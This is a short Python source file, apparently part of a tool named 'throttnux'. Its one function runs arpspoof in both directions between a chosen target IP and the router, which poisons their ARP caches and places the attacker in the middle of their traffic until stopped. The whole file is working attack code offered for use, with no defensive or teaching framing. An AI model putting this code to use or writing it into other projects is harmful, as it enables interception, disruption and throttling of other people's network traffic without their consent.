import subprocess
import logging

log = logging.getLogger("throttnux")


def arp_spoof_loop(interface, target_ip, router_ip, stop_event, status=None):
    proc_target = subprocess.Popen(
        ["arpspoof", "-i", interface, "-t", target_ip, router_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    proc_router = subprocess.Popen(
        ["arpspoof", "-i", interface, "-t", router_ip, target_ip],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL
    )

    try:
        stop_event.wait()
    finally:
        for p in (proc_target, proc_router):
            p.terminate()

        for p in (proc_target, proc_router):
            try:
                p.wait(timeout=2)
            except subprocess.TimeoutExpired:
                p.kill()